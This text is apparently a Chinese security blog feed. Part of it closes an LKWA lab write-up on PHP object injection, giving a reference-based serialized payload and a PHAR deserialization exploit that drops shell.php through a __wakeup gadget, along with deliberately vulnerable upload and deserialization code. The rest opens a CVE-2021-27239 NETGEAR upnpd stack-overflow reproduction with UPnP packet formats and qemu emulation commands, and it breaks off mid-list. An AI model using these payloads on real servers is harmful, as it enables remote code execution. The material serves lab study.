<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object Injection via Cookie</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// eval($this-&gt;cmd);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="PHP-Object-Injection-Object-Reference"><a href="#PHP-Object-Injection-Object-Reference" class="headerlink" title="PHP Object Injection(Object Reference)"></a>PHP Object Injection(Object Reference)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;objectref.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;exampleInputEmail1&quot;&gt;Guess&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Enter number&quot; name=&quot;guess&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;input&quot; value=&#x27;O:8:&quot;stdClass&quot;:2:&#123;s:5:&quot;guess&quot;;N;s:10:&quot;secretCode&quot;;R:1;&#125;&#x27;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;p class=&quot;text-danger&quot;&gt; Can you win this?.&lt;/p&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    // vuln code</span><br><span class="line">    if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">        // code...</span><br><span class="line">        $obj = unserialize($_POST[&#x27;input&#x27;]);</span><br><span class="line">        if($obj) &#123;</span><br><span class="line">            $obj-&gt;guess = $_POST[&#x27;guess&#x27;];</span><br><span class="line">            $obj-&gt;secretCode = rand(500000,999999);</span><br><span class="line">            if($obj-&gt;guess === $obj-&gt;secretCode) &#123;</span><br><span class="line">                echo &quot;&lt;p class=&#x27;text-success&#x27;&gt;You Win !!!!!&lt;/p&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &quot;&lt;p class=&#x27;text-danger&#x27;&gt;Loser!!!!&lt;/p&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>当你将一个对象赋值给一个变量时，这个变量会成为该对象的“引用”。如果你将这个变量赋值给另一个变量，则这两个变量都将引用同一个对象。改变其中任何一个变量所引用对象的状态将影响到所有引用该对象的变量。</p>
<p>下面是一个简单的示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$myVar</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;myVar = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a reference to $obj</span></span><br><span class="line"><span class="variable">$ref</span> = &amp;<span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update $obj-&gt;myVar</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;myVar = <span class="string">&quot;Goodbye World&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ref</span>-&gt;myVar; <span class="comment">// Output: Goodbye World</span></span><br></pre></td></tr></table></figure>

<p>构造EXP：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$guess</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$secretCode</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Object1</span>();</span><br><span class="line"><span class="variable">$x</span>-&gt;guess = &amp;<span class="variable">$x</span>-&gt;secretCode;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在改变 guess 的值的同时也会改变 secretCode。</p>
<h2 id="PHAR-Deserialization"><a href="#PHAR-Deserialization" class="headerlink" title="PHAR Deserialization"></a>PHAR Deserialization</h2><p>PHP phar是一种用于打包和分发PHP应用程序的技术。PHAR代表“PHP归档”，它将多个PHP源代码文件打包成单个文件，这个文件可以像一个可执行文件一样运行。<strong>注意：需要 phar.readonly &#x3D; Off</strong>。</p>
<p>创建一个 phar 文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建Phar打包对象</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;myapp.phar&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始定义打包内容</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加源代码文件到PHAR文件中</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">buildFromDirectory</span>(<span class="string">&#x27;/path/to/source/files&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将脚本添加到PHAR文件中作为可执行文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">createDefaultStub</span>(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 完成打包操作并保存PHAR文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>调用 phar 文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;my_app.phar&#x27;</span>; <span class="comment">//加载已经打包好的Phar文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用打包好的PHP应用程序</span></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">MyApp</span>();</span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br></pre></td></tr></table></figure>

<p>学习一下网站的源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// uoload.php</span></span><br><span class="line"><span class="comment">// 限制了只能上传 phar 文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;sidebar.php&quot;</span>);</span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$target_file</span>,PATHINFO_EXTENSION));		<span class="comment">// 获取扩展名</span></span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$imageFileType</span> !== <span class="string">&quot;PHAR&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not a PHAR file.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if file already exists</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow certain file formats</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;phar&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only PHAR file is allowed.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line"><span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// phar_deserial.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;sidebar.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;log.txt&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$data</span>=<span class="string">&quot;log&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$var</span> = <span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里 phar 文件里可以包含反序列化的内容，file_exists 函数可以触发反序列化。同时也有其他的函数也会触发，如下表：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/phar.png" alt="phar"></p>
<p>这里利用 php 语言生成 phar 文件。<strong>注意：需要 phar.readonly &#x3D; Off</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create new Phar</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;pharfile.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;pharfile.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;data&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// add object of any class as meta data</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="variable">$object</span>-&gt;filename = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$object</span>-&gt;data = <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> log;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);	<span class="comment">// 将 $object 添加为 PHAR 文件的元数据</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230425143449527.png" alt="image-20230425143449527"></p>
<p>利用 <code>phar://</code> 协议访问这个 phar 文件，成功的话会生成 shell.php。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.lkwa.com/phar_deserial/phar_deserial.php?file=phar://pharfile.phar</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230425143637769.png" alt="image-20230425143637769"></p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>So easy!</p>
<h2 id="Variable-variable"><a href="#Variable-variable" class="headerlink" title="Variable variable"></a>Variable variable</h2><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230425150948817.png" alt="image-20230425150948817"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>LKWA</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-27239 复现</title>
    <url>/2023/04/05/Iot/CVE-2021-27239/</url>
    <content><![CDATA[<h2 id="UPnP服务详解"><a href="#UPnP服务详解" class="headerlink" title="UPnP服务详解"></a>UPnP服务详解</h2><p>做上一篇CVE的时候没有好好了解upnp服务相关的数据包，这次希望能深入了解upnp的机制，问了一下chatgpt。</p>
<p>UPnP协议将整个通信过程分为五个步骤，分别是：</p>
<ul>
<li><p>Step0：地址分配，也就是设备通过DHCP等协议获取IP地址的过程。 </p>
</li>
<li><p>Step1：设备发现，控制点通过组播的方式向网络中的所有设备发送消息，以发现网络中的UPnP设备。该步骤有两种数据包：搜索请求和搜索响应。搜索请求是由控制点发送的组播消息，用于发现网络中的UPnP设备。搜索响应是由UPnP设备返回的单播消息，其中包含了UPnP设备的描述信息。 </p>
<p>搜索请求数据包格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">Host:239.255.255.250:1900</span><br><span class="line">ST:upnp:rootdevice</span><br><span class="line">Man:&quot;ssdp:discover&quot;</span><br><span class="line">MX:3</span><br></pre></td></tr></table></figure>

<p>搜索响应数据包格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line">Cache-Control:max-age=1800</span><br><span class="line">ST:upnp:rootdevice</span><br><span class="line">USN:uuid:DeviceUUID::upnp:rootdevice</span><br><span class="line">Location:http://192.168.1.100/description.xml</span><br><span class="line">Server:OS/version UPnP/1.0 product/version</span><br></pre></td></tr></table></figure></li>
</ul>
<span id="more"></span>

<ul>
<li><p>Step2：描述设备，控制点通过向设备发送消息，获取设备的描述信息，包括设备的类型、服务、状态等。该步骤有两种数据包：描述请求和描述响应。描述请求是由控制点发送的单播消息，用于获取UPnP设备的描述信息。描述响应是由UPnP设备返回的单播消息，其中包含了UPnP设备的描述信息。 </p>
<p>描述请求数据包格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/description.xml</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:192.168.1.100</span><br></pre></td></tr></table></figure>

<p>描述响应数据包格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type:text/xml; charset=&quot;utf-8&quot;</span><br><span class="line">Content-Length:1234</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-upnp-org:device-1-0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">specVersion</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">major</span>&gt;</span>1<span class="tag">&lt;/<span class="name">major</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">minor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">minor</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">specVersion</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">device</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:Basic:1<span class="tag">&lt;/<span class="name">deviceType</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">friendlyName</span>&gt;</span>My Device<span class="tag">&lt;/<span class="name">friendlyName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">manufacturer</span>&gt;</span>My Manufacturer<span class="tag">&lt;/<span class="name">manufacturer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">manufacturerURL</span>&gt;</span>http://www.mymanufacturer.com/<span class="tag">&lt;/<span class="name">manufacturerURL</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">modelDescription</span>&gt;</span>My Device Description<span class="tag">&lt;/<span class="name">modelDescription</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">modelName</span>&gt;</span>My Model Name<span class="tag">&lt;/<span class="name">modelName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">modelNumber</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">modelNumber</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">modelURL</span>&gt;</span>http://www.mymanufacturer.com/mydevice.html<span class="tag">&lt;/<span class="name">modelURL</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">serialNumber</span>&gt;</span>1234567890<span class="tag">&lt;/<span class="name">serialNumber</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">UDN</span>&gt;</span>uuid:DeviceUUID<span class="tag">&lt;/<span class="name">UDN</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">device</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Step3：控制设备，控制点通过向设备发送消息，控制设备的状态和行为。该步骤有两种数据包：控制请求和控制响应。控制请求是由控制点发送的单播消息，用于控制UPnP设备的状态和行为。控制响应是由UPnP设备返回的单播消息，其中包含了对控制请求的响应信息。 </p>
<p>控制请求数据包格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upnp/control/basicevent1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:192.168.1.100</span><br><span class="line">Content-Type:text/xml; charset=&quot;utf-8&quot;</span><br><span class="line">SOAPAction:&quot;urn:schemas-upnp-org:service:basicevent:1#SetBinaryState&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">s:Envelope</span> <span class="attr">xmlns:s</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">s:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">s:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">u:SetBinaryState</span> <span class="attr">xmlns:u</span>=<span class="string">&quot;urn:schemas-upnp-org:service:basicevent:1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">BinaryState</span>&gt;</span>0<span class="tag">&lt;/<span class="name">BinaryState</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">u:SetBinaryState</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">s:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">s:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>控制响应数据包格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type:text/xml; charset=&quot;utf-8&quot;</span><br><span class="line">Content-Length:length</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">s:Envelope</span> <span class="attr">xmlns:s</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">s:encodingStyle</span></span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Step4：事件处理，当设备状态发生变化时，会向控制点发送事件通知。该步骤有两种数据包：订阅请求和事件通知。订阅请求是由控制点发送的单播消息，用于订阅UPnP设备状态变化时产生的事件通知。事件通知是由UPnP设备返回的单播消息，其中包含了UPnP设备状态变化时产生的事件信息。</p>
<p>订阅请求数据包格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SUBSCRIBE</span> <span class="string">/upnp/event/basicevent1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:192.168.1.100</span><br><span class="line">CALLBACK:&lt;http://192.168.1.101:8080&gt;</span><br><span class="line">NT:upnp:event</span><br><span class="line">TIMEOUT:Second-300</span><br></pre></td></tr></table></figure>

<p>事件通知数据包格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type:text/xml; charset=&quot;utf-8&quot;</span><br><span class="line">Content-Length:length</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">s:Envelope</span> <span class="attr">xmlns:s</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">s:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">s:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">u:SetBinaryStateResponse</span> <span class="attr">xmlns:u</span>=<span class="string">&quot;urn:schemas-upnp-org:service:basicevent:1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">BinaryState</span>&gt;</span>0<span class="tag">&lt;/<span class="name">BinaryState</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">u:SetBinaryStateResponse</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">s:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">s:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><p>官网上这样描述：此漏洞允许网络相邻攻击者在受影响的 NETGEAR R6400 和 R6700 固件版本 1.0.4.98 路由器安装上执行任意代码。利用此漏洞不需要身份验证。该漏洞存在于默认情况下侦听 UDP 端口 1900 的 upnpd 服务中。SSDP 消息中精心制作的 MX 标头字段可以触发固定长度的基于堆栈的缓冲区溢出。攻击者可以利用此漏洞在 root 上下文中执行代码。</p>
<p>根据介绍我们在IDA中搜索字符串<code>MX</code>即可定位到漏洞点，很明显这里没有对MX字段的长度做检测，导致栈溢出。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230322194736789.png" alt="image-20230322194736789"></p>
<p>相关调用链如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230322195014814.png" alt="image-20230322195014814"></p>
<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><h3 id="利用qemu-arm-static"><a href="#利用qemu-arm-static" class="headerlink" title="利用qemu-arm-static"></a>利用qemu-arm-static</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp $(which qemu-arm-static) .</span><br><span class="line">sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd		# 没有回显</span><br><span class="line">sudo chroot . ./qemu-arm-static -strace ./usr/sbin/upnpd		# 跟踪一下</span><br></pre></td></tr></table></figure>

<p>缺失相关文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ./tmp/var/run</span><br><span class="line">rm ./var</span><br><span class="line">ln -s ./tmp/var/ ./var</span><br><span class="line">sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure>

<p>显示没有NVRAM文件。NVRAM（Non-Volatile Random Access Memory）是一种非易失性随机存取存储器，它能够在断电时保存数据。固件模拟与NVRAM有关系，因为在进行固件模拟时，我们需要模拟整个嵌入式系统的运行环境，包括系统配置信息、参数和状态等。这些信息通常存储在NVRAM中，并在系统启动时被读取。</p>
<p>嵌入式应用程序通常通过共享库与NVRAM交互。该库又与包含设备当前配置设置的MTD分区接口交互。如果没有NVRAM配置数据，许多程序将无法正常运行，比如说当遇到<code>nvram_get()</code>、<code>nvram_set()</code>、<code>nvram_get()</code>这些函数时，<strong>需要我们拦截NVRAM库调用并返回有效数据</strong>，以便在Qemu中正确执行应用程序。</p>
<p>利用uClibc进行编译，该种libc是面向嵌入式Linux系统的小型的C标准库。</p>
<blockquote>
<p>uClibc编译器项目：<a href="https://github.com/RMerl/am-toolchains">GitHub - RMerl&#x2F;am-toolchains: Asuswrt-Merlin toolchains</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230403165300857.png" alt="image-20230403165300857"></p>
<blockquote>
<p>nvram的hook项目：</p>
<ul>
